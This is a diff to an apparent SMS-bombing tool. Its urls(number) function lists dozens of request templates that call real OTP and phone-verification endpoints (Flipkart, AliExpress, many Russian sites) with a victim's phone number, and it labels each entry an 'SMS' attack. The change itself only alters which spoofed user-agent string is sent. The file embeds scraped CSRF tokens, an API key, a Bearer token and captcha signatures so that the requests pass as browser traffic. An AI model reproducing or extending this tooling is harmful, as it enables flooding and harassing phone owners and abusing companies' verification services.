@@ -3381,7 +3381,7 @@ def urls(number):
             'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Flipkart', 'anonymous': 'No'},
             'method': 'post',
             'url': 'https://www.flipkart.com/api/5/user/otp/generate',
-            'headers': {'Origin': 'https://www.flipkart.com', 'X-user-agent': user_agent()},
+            'headers': {'Origin': 'https://www.flipkart.com', 'X-user-agent': user_agent()[1]},
             'data': {'loginId': number},
         },
         {
@@ -3838,7 +3838,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-dtpc': '35$218386451_656h22vHNHRKMKCHCNADGPTHMKUBQCSAAMPGQTD-0e0',
                 'x-requested-with': 'XMLHttpRequest'
             },
@@ -3871,7 +3871,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-app-id': 'PROFI',
                 'x-new-auth-compatible': '1',
                 'x-requested-with': 'XMLHttpRequest',
@@ -3912,7 +3912,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-site',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'AB-TESTS': '{"personal_feed":"cumulative"}',
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -3984,7 +3984,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-requested-with': 'XMLHttpRequest'
             },
             'data': {"/appData/action": "init_phone_confirmation", "/appData/griffinData": "true",
@@ -4126,7 +4126,7 @@ def urls(number):
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
                 'sentry-trace': '355c468a4ec348ab85785e9e92a58cfb-98221c61647946d4-1',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw',
                 'content-length': '164',
                 'origin': 'https://abc.ru',
@@ -4163,7 +4163,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0]
+                'user-agent': user_agent()[1]
             },
             'data': {
                 '{"login': number,
@@ -4195,7 +4195,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'version': 'b835b033'
             },
             'data': {
@@ -4227,7 +4227,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-site',
-                'user-agent': user_agent()[0]
+                'user-agent': user_agent()[1]
             },
             'data': {
                 '{"operationName': number,
@@ -4327,7 +4327,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-csrf-token': 'FSP8p7pYb7YwNMG71KtkOOsC5WSJpcUwNohCfKHA',
                 'x-requested-with': 'XMLHttpRequest'
             },
@@ -4357,7 +4357,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-ott-cookie': '',
                 'Host': 'id.x5.ru',
                 'Connection': 'keep-alive',
@@ -4403,7 +4403,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0]
+                'user-agent': user_agent()[1]
             },
             'data': {
                 '{"jsonrpc': '2.0", "id": "15930021-2bf0-4be4-acef-065304196abb", "method": "create',
@@ -4439,7 +4439,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-device-uid': 'b22e8141-a6a2-49e9-addf-d0958d4b2bef',
                 'x-version-fe': '1666591147478'
             },
@@ -4479,7 +4479,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'version': 'b835b033'
             },
             'data': {
@@ -4759,7 +4759,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0]
+                'user-agent': user_agent()[1]
             },
             'data': {
                 'mobilePhone': number,
@@ -4871,7 +4871,7 @@ def urls(number):
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
                 'tele2-user-agent': 'web',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-ajax-token': 'b382122191e9582bd66d958796abe7397c63a42c493c56ca4b8acfc965e7b11c',
                 'x-csrftoken': '172606399efc805c7c4123a0dfeff94afb700ee884ccd72ecf2206201ee028c941f18bf7f5acf1e8',
                 'x-request-id': 'HVRe0j56mcGaJpdnoFXqxBg89wQfLsA7OkvDzurS',
@@ -4904,7 +4904,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-requested-with': 'XMLHttpRequest'
             }
         },
@@ -4966,7 +4966,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-site',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-wheely-sign': 'eyJ0eXBlIjoiY2FwdGNoYSIsInNpZ25hdHVyZSI6IlAwX2V5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp3WVhOemEyVjVJam9pTkVkemJqUnlaMVpTUjAxMWNFZHNiMGxLT0ZwT1NURjNTMVpxWjBkNGVqWmhSVEUwZVd0SVEyTlJWR2cwV0hWTE5qQndOMlZZYUVsNlEwazRTakZVTXpsalEycE9RWGw2Vm1oS2QzQjBjbGQ1TlZaQ1NVNUVaRzFsTkZGRlIydG1iMDl6TVVSaFoyeDJaVnBIVnpObGFGWXpZa1kyY1VZeFdIQXpZa3c0TVdwTVJVaFhkbTQ0Ymtvek1GZE5SRUUzZFhSWVdsSjVTblIzWjNBeU1sTkZNemhEVjFCa1JGZGFSMXBpTXprNE5HSXlOa3huZURWVmJHaFdhRkZQYnpCcGRHbGFkMnRSZWpBclRVTTJka2t3ZFVOdFNHOURRbXhOUVUwM1dWVm1aVTQ0TDI5c04yRm9XbUY2TW1GMFYyMW9Ra2h0TkZaeFlUTkZOa1ZsT0VWdlJtOWtRWE12Y0VOdU1IbERXbk42T0M5VWMxYzJZVTlGYnpoQk5EZEdhbUprZWpaYU5XeEdObUU0VjBzd1UzQkJOVFZPYm1samEyWnRlVXRuWjBOeVQwaEhXRVJvV1RkamJIRTRObTltTTNkaVUyaHRhbUZMV0NzNU9EbFZla2RXVDB4WlJ6VXpVRzQxV1dGSkwzQXZRbUZXWWpaUFYzY3pjRWxOVUZGeFUzSnFPVW80ZG5KQmVscEtVV3RtYUdWU1JtTjFSUzlwYmxSVFF6Sk1RelZxT1VoSU4xZzNVRlJoTXpCWldrZ3JUVmxQUm1RNE9XRTBUbmhrUmtzcmJFTmhhMlYwV0UwMFdIaGplRFV3UTFKSVpWVlRaek5zYTFaVlZIaExVVGx0Wmxwa04wUlphRXhUWVRodU1DOURiSGhIVVdGcFdVOXhjRWg0U0RCeFdsSXpjM1ZIUjBWak4ySTBVRmxJWjNaaksydE5hVU41U0ZFemFWWnVRemxGVFhkNFJHdDZVMmM0ZEZocWVHZENlbnB3YjFJelNscFhRM2hsWkZZMGNUWjNlak15TkVoUmNtVnFjbWN3YWs0eWFYaDRlWHBsWlRBM1VsTXdTMnBzTVRkbmNVNDJkM0ZWVVM5V1V6VTNNM1JTZUdwS1JYVjVOV2RZWlc1WU5VRlFjRFpZYmxaWldUa3JXRTVxZUd4bFozVXZZVTB2Y1V4UU9Xb3ZjMHQxSzA5WWFrOUdTemxKUTBnM05EZHJjRWN5TTJreFkxcExRVzg0V21neWNsVnJhblpzUTA1cmVsUnBRV3QzTXpabk55ODJVWE01YXpaU1IwNXNjM0ZWTldwS1drcHhMMVF5ZEVwVk9WRnJlRzFoTUdzMFlXdHliR2Q1UkZGVVZtaHBlV1ZFV1ZWVGNYSkhUM0oxY1haYU1TOXRNbEJuVGpkV01FVXZOMjFaYUdGelNESnVTR2RpVTBsamVXcFdhVmQwVW5KUlFtbFVjVzlVZW05blpUbFFjMFpwTlhCUVFubEdUVFpOVDFWNFRuRnFWV2xOUkdKT00wTlFWRVpyWTNBNE5FTkpaV1pNTm1Kck5FSjZZM29yU21OdFNqSm9jV3RrZFRoSU5UWjNWRmRJUjNWUE1uUlFkWFJGWW1KTU9FdHVXRmh0TlRWNlUwbHJUVXB3YTBGeFRGZ3JSV3cwYkZwSFNETTRTM05qY0RFd09DczJNV2RpU2tGRFoyWkNWa2hXYURkbFRqUkpUbEpUVEdVeGIyWjZPWFZHWlhkV1drSXpZa05oUTBkMGRuUm1Ta1pHVUhwWFluWm9NM0ZqSzNWYWEzbHBOR056WTBsT2QzSndRMVJZY2sxR05XaGhiVXBOTm0xd1NEWTVkRzB2V0had1NVZG9aWEF3VFhCcGNHVkxXREV5VDFCM09ERjFjRU5YVDJSMU4wbHlabk5wUW1waVFrUkdOMHBxY0dkaVowOTVkMUZaWTFSeWVFODFTWGhzZFRkWWNVOUVjbEpLYVRSalZUTnJOM3AyVjJSTlpVNDVjV1pTU0hkeVowSk1PR3MyVUhCYU5DOXpjSFJ3TXpJNVEzVXZLM2hIVUdjemJtdFhXV3RSZFd4SmRWRlZUV3hSUTI5UVkxQlhNV3Q2WVVsRGNrVnllVGhEVkRSUVZsaGxWa2xYVEhrNWRHWjRaak5KVkdoTFpERm9NV2hGWWpsVFNtaHljRVY1TVhGaGVIVTJaeXRqZG1WQmQwRm1SVUpvZVhoTk9XeFZVMWhFUnpadlEwcDFOblJUZERWNVVGaERNRWhoYURFNGRUTXJVRFE1VEV4UmNGQkNUeXRtVkdwbVdVSjRVM1ZyZHpKc2FUTlRUbXhESzNsRlJFNUZNbmswTDJZd1dIY3dSMG8wWVdOYVFrNDNkVXhTVFdOb01YcG1NWGgwTkRGWE9WUm9iM3BtWTNKNlRucHVXRGRsY3k5dmRGaDJTM0ZMWm1OR2NHRlZNVWxSZEU1M1VXNVdjbTF5Um5wbFJuUmlkbFJZTjBkRFFrdFRVRUpyUVUxVVJuRktOR1ZOVTNoM2NrZG1kMGRUVUdSTGFDdEpWSFpXVEV4RFEwdEdhR04yZVhwWVpXOXJTWEUyTmpKd1JVbENlQ3Q2T0hwdmNHVjVhVUYyVURFek55czJSSFJSTlZwYWNISlpSbEFpTENKbGVIQWlPakUyTmpnd01qazBORFlzSW5Ob1lYSmtYMmxrSWpvek16azFNVEF6TURNc0luQmtJam93ZlEuaEQ4RHIzRFRxenRZb3JzNTQ0ZjJRQzVsQ0V6LVY1WkhDeWZJNFFtcmdpbyJ9'
             },
             'data': {
@@ -4997,7 +4997,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'cross-site',
-                'user-agent': user_agent()[0]
+                'user-agent': user_agent()[1]
             },
             'data': {
                 '{"reqId': '85231-1668029727',
@@ -5030,7 +5030,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0]
+                'user-agent': user_agent()[1]
             },
             'data': {
                 '__RequestVerificationToken': 'CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41SftrzCGJ0NjJWXj04eT9whWjnEE37nwuELHlp42n3cj3_8E36WbypiKwpbcwu7ykP40eOWeONUwI7q_hRaxaTJ2pIqKFx5bB3tWc72gaHTsA2npAdpsIh2OA',
@@ -5062,7 +5062,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-xsrf-token': 'eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9'
             },
             'data': {
@@ -5095,7 +5095,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-aer-cna': '-'
             },
             'data': {
@@ -5105,7 +5105,7 @@ def urls(number):
                 'umidToken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
                 'regSrc': 'AE_MAIN_LOGIN", "securityTimestamp": 1668031201204',
                 'refer': 'https://aliexpress.ru/',
-                'userAgent': user_agent()[0]
+                'userAgent': user_agent()[1]
             }
         },
         {
@@ -5175,7 +5175,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'cross-site',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'x-api-key': 'XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu',
                 'x-app-version': 'PWA 2.3.1'
             },
@@ -5206,7 +5206,7 @@ def urls(number):
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'cross-site',
-                'user-agent': user_agent()[0],
+                'user-agent': user_agent()[1],
                 'Authorization': 'Bearer ODFlODkwNjM4YTdmN2E0ZWM1Yjk4YWU1NGY2NDFiZTJiNDFhNDJlZTM1ZDY0NDc5MDYyN2QzYjdlNzI5ZGNhMw'
             },
             'data': {
@@ -5640,7 +5640,7 @@ def urls(number):
             'method': 'post',
             'url': 'https://www.flipkart.com/api/5/user/otp/generate',
             'headers': {
-                'X-user-agent': user_agent()[0],
+                'X-user-agent': user_agent()[1],
                 'Origin': 'https://www.flipkart.com',
                 'Content-Type': 'application/x-www-form-urlencoded'
             },
@@ -6221,7 +6221,7 @@ def urls(number):
             'method': 'post',
             'url': 'https://www.flipkart.com/api/5/user/otp/generate',
             'headers': {
-                'X-user-agent': user_agent()[0],
+                'X-user-agent': user_agent()[1],
                 'Origin': 'https://www.flipkart.com',
                 'Content-Type': 'application/x-www-form-urlencoded'
             },
